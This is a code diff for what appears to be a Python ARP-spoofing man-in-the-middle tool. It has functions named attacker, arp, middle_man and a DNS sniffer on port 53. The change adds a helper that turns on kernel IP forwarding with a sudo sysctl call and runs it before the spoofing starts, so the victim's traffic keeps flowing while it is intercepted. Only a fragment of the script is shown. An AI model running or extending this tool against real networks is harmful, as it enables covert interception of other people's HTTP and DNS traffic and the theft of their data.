@@ -7,6 +7,10 @@ from uuid import getnode
 import subprocess
 from scapy.layers.http import HTTPRequest
 
+def forwarding(open):
+    os.system('sudo sysctl -w net.ipv4.ip_forward={} > /dev/null 2>&1'.format(str(open)))
+
+
 def attacker():
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	IP = ""
@@ -127,7 +131,7 @@ def middle_man():
 def DNS_inter():
 	sniff(count=0, prn = show_http_pkt, filter="port 53")
 
-
+forwarding(1)
 arp()
 middle_man()
 
